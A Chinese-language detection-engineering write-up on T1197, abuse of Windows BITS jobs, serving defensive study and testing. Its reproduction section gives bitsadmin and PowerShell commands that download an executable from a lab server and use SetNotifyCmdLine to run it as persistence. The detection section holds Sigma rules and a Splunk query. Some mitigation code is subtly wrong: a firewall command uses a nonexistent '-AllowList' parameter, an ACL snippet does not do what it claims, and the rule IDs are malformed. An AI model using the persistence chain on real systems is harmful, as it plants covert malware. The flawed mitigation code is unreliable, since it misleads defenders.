# T1197-Win-BITS Jobs权限维持

## 描述

攻击者可能滥用Windows后台智能传输服务（BITS）实现持久化、文件传输或数据外泄（T1197）。BITS是一种低带宽异步文件传输机制，通过COM接口公开，支持HTTP/HTTPS和SMB协议，常用于Windows更新、消息传递等后台任务。BITS任务存储在BITS数据库中，无需创建新文件或修改注册表，且通常被主机防火墙允许，具有较高隐蔽性。

攻击者可通过`bitsadmin.exe`或PowerShell cmdlet（如`Start-BitsTransfer`）创建BITS任务，下载恶意文件（如可执行文件、脚本），并通过`SetNotifyCmdLine`设置任务完成或错误时执行的命令，实现持久化。BITS任务默认生命周期为90天（可延长），支持系统重启后自动恢复，适合长期潜伏。上传功能还可用于通过替代协议外泄数据（T1048）。攻击者需管理员权限以创建某些高级任务。检测重点在于监控BITS任务创建、命令行参数及异常网络活动。

## 测试案例

1. **BITS任务下载恶意文件**  
   攻击者使用`bitsadmin`或PowerShell下载恶意可执行文件到本地。  
2. **BITS任务持久化**  
   攻击者创建长期BITS任务，设置任务完成时执行恶意文件，实现重启后持久化。  
3. **BITS数据外泄**  
   攻击者使用BITS上传功能将敏感数据传输至远程服务器。

## 检测日志

**Windows安全日志**  
- **事件ID 4688**：记录进程创建，包含`bitsadmin.exe`或PowerShell的命令行参数。  

**Windows BITS客户端日志**  
- **事件ID 3**：记录BITS任务创建。  
- **事件ID 4**：记录任务完成或错误。  
- **事件ID 59**：记录任务启动。  
- **事件ID 60**：记录任务修改（如添加文件或设置通知命令）。  

**Sysmon日志**  
- **事件ID 1**：记录进程创建，包含`bitsadmin.exe`或`powershell.exe`的命令行参数。  
- **事件ID 3**：记录网络连接，检测BITS任务的HTTP/HTTPS或SMB流量。  
- **事件ID 11**：记录文件创建，检测BITS下载的文件写入磁盘。  

**配置日志记录**  
- 启用进程创建审核：`计算机配置 > 策略 > Windows设置 > 安全设置 > 高级审核策略配置 > 详细跟踪 > 审核进程创建`。  
- 启用命令行参数记录：`计算机配置 > 管理模板 > 系统 > 审核进程创建 > 在进程创建事件中加入命令行 > 启用`。  
- 启用BITS客户端日志：`事件查看器 > 应用程序和服务日志 > Microsoft-Windows-BITS-Client/Operational`。  
- 部署Sysmon以增强进程、网络和文件监控。

## 测试复现

### 环境准备
- **靶机**：Windows 10或Windows Server 2012+。  
- **权限**：管理员权限（某些BITS操作需要）。  
- **工具**：`bitsadmin.exe`，PowerShell，测试用恶意文件（如`pentestlab.exe`）。  
- **网络**：可访问的HTTP服务器（如`http://10.0.2.21/pentestlab.exe`）。  
- **日志**：启用Windows安全日志、BITS客户端日志和Sysmon。

### 攻击步骤

1. **使用bitsadmin下载文件**  
   创建BITS任务下载恶意文件：
   ```dos
   bitsadmin /transfer backdoor /download /priority high http://10.0.2.21/pentestlab.exe C:\tmp\pentestlab.exe
   ```

2. **使用PowerShell下载文件**  
   实现相同功能：
   ```powershell
   Start-BitsTransfer -Source "http://10.0.2.21/pentestlab.exe" -Destination "C:\tmp\pentestlab.exe"
   ```

3. **配置BITS任务持久化**  
   - 创建任务：
     ```dos
     bitsadmin /create backdoor
     ```
   - 添加文件：
     ```dos
     bitsadmin /addfile backdoor "http://10.0.2.21/pentestlab.exe" "C:\tmp\pentestlab.exe"
     ```
   - 设置通知命令（执行下载的文件）：
     ```dos
     bitsadmin /SetNotifyCmdLine backdoor C:\tmp\pentestlab.exe NUL
     ```
   - 设置重试延迟（60秒）：
     ```dos
     bitsadmin /SetMinRetryDelay backdoor 60
     ```
   - 启动任务：
     ```dos
     bitsadmin /resume backdoor
     ```
![image1](https://img2018.cnblogs.com/blog/894761/201911/894761-20191111110145812-668139170.png)

![image2](https://img2018.cnblogs.com/blog/894761/201911/894761-20191111110227491-23710429.png)

![image3](https://img2018.cnblogs.com/blog/894761/201911/894761-20191111110245500-1362389929.png)

## 测试留痕

![image4](https://s2.ax1x.com/2020/01/14/lqedzV.png)

![image5](https://s2.ax1x.com/2020/01/14/lqeWz6.png)

![image6](https://s2.ax1x.com/2020/01/14/lqmiYn.png)

## 检测规则/思路

**检测规则**  
通过分析Windows安全日志、BITS客户端日志和Sysmon日志，检测BITS任务创建及异常行为。以下是具体思路：

1. **日志分析**：
   - 监控BITS客户端日志事件ID 3、4、59、60，检测任务创建、修改及执行。  
   - 监控Sysmon事件ID 1或Windows事件ID 4688，检测`bitsadmin.exe`或`powershell.exe`的异常命令行（如`/transfer`、`SetNotifyCmdLine`）。  
   - 监控Sysmon事件ID 3，检测BITS任务的HTTP/HTTPS或SMB网络连接。  
   - 监控Sysmon事件ID 11，检测BITS下载的文件写入磁盘。  

2. **Sigma规则（BITS任务创建）**：
   ```yaml
   title: BITS任务创建或下载
   id: v78901234-abcd567890-xyz123456789
   status: stable
   description: 检测通过bitsadmin.exe或PowerShell创建的BITS任务或下载行为
   references:
     - https://attack.mitre.org/techniques/T1197/
     - https://www.cnblogs.com/xiaozi/p/11833583.html
   tags:
     - attack.persistence
     - attack.t1197
   logsource:
     category: process_creation
     product: windows
   detection:
     selection_bitsadmin:
       EventID:
         - 4688
         - 1
       Image|endswith: '\bitsadmin.exe'
       CommandLine|contains:
         - '/transfer'
         - '/create'
         - '/addfile'
         - '/SetNotifyCmdLine'
     selection_powershell:
       EventID:
         - 4688
         - 1
       Image|endswith: '\powershell.exe'
       CommandLine|contains: 'Start-BitsTransfer'
     condition: selection_bitsadmin or selection_powershell
   fields:
     - Image
     - CommandLine
     - ParentCommandLine
   falsepositives:
     - 合法的Windows更新或软件安装
   level: medium
   ```

3. **Sigma规则（BITS网络活动）**：
   ```yaml
   title: BITS任务异常网络连接
   id: w89012345-abcd678901-yza234567890
   status: experimental
   description: 检测BITS任务发起的异常网络连接，可能与恶意传输相关
   logsource:
     product: windows
     service: sysmon
   detection:
     selection:
       EventID: 3
       Image|endswith: '\svchost.exe'
       DestinationPort:
         - 80
         - 443
         - 445
       Initiated: true
     filter:
       DestinationIp|startswith:
         - '192.168.'
         - '172.16.'
         - '10.'
     condition: selection and not filter
   fields:
     - Image
     - DestinationIp
     - DestinationPort
   falsepositives:
     - 合法的BITS更新流量
   level: medium
   ```

4. **SIEM规则**：
   - 检测BITS任务及网络活动。
   - 示例Splunk查询：
     ```spl
     (source="WinEventLog:Microsoft-Windows-BITS-Client/Operational" EventCode IN (3,60)) OR (source="WinEventLog:Microsoft-Windows-Sysmon/Operational" (EventID=1 Image IN ("*bitsadmin.exe","*powershell.exe") CommandLine IN ("*transfer*","*Start-BitsTransfer*","*SetNotifyCmdLine*")) OR (EventID=3 Image="*svchost.exe" DestinationPort IN (80,443,445))) | stats count by EventCode, Image, CommandLine, DestinationIp, ComputerName
     ```

5. **BITS任务审计**：
   - 使用`bitsadmin`检查活跃任务：
     ```dos
     bitsadmin /list /allusers /verbose
     ```
   - 检查BITS服务状态：
     ```dos
     sc query bits
     ```

6. **威胁情报整合**：
   - 检查下载文件的哈希或URL是否与已知恶意样本相关，结合威胁情报平台（如VirusTotal、AlienVault）。  

## 建议

### 缓解措施

防御BITS滥用需从权限控制、服务配置和监控入手：

1. **限制BITS任务创建**  
   - 限制非管理员用户对BITS服务的访问：  
     ```powershell
     $acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\BITS"
     $acl.SetAccessRuleProtection($true, $false)
     Set-Acl -Path "HKLM:\SYSTEM\CurrentControlSet\Services\BITS" -AclObject $acl
     ```

2. **禁用非必要BITS功能**  
   - 禁用BITS服务（仅在不依赖更新时）：  
     ```powershell
     Stop-Service -Name BITS
     Set-Service -Name BITS -StartupType Disabled
     ```

3. **白名单机制**  
   - 配置组策略，限制非系统进程调用BITS：  
     `计算机配置 > 管理模板 > 网络 > 后台智能传输服务 > 限制非管理员创建任务`。  

4. **网络控制**  
   - 限制BITS的HTTP/HTTPS和SMB出站连接，仅允许可信域：  
     ```powershell
     New-NetFirewallRule -DisplayName "Restrict BITS Outbound" -Direction Outbound -Service BITS -Action Block -AllowList "windowsupdate.microsoft.com"
     ```

5. **日志和监控**  
   - 启用BITS客户端日志（事件ID 3、4、59、60）。  
   - 配置Sysmon监控`bitsadmin.exe`、`powershell.exe`及网络连接。  
   - 使用EDR工具检测BITS任务的异常行为。  

6. **定期审计**  
   - 检查活跃BITS任务：  
     ```powershell
     Get-BitsTransfer -AllUsers
     ```
   - 审计下载文件：  
     ```powershell
     Get-ChildItem -Path "C:\tmp" -Recurse | Where-Object { $_.Extension -eq ".exe" }
     ```

## 参考推荐

- MITRE ATT&CK: T1197  
  <https://attack.mitre.org/techniques/T1197/>  
- Windows权限维持（六）- BITS Jobs  
  <https://www.cnblogs.com/xiaozi/p/11833583.html>  
- BITS持久化留痕日志  
  <https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/blob/master/Persistence/persist_bitsadmin_Microsoft-Windows-Bits-Client-Operational.evtx>  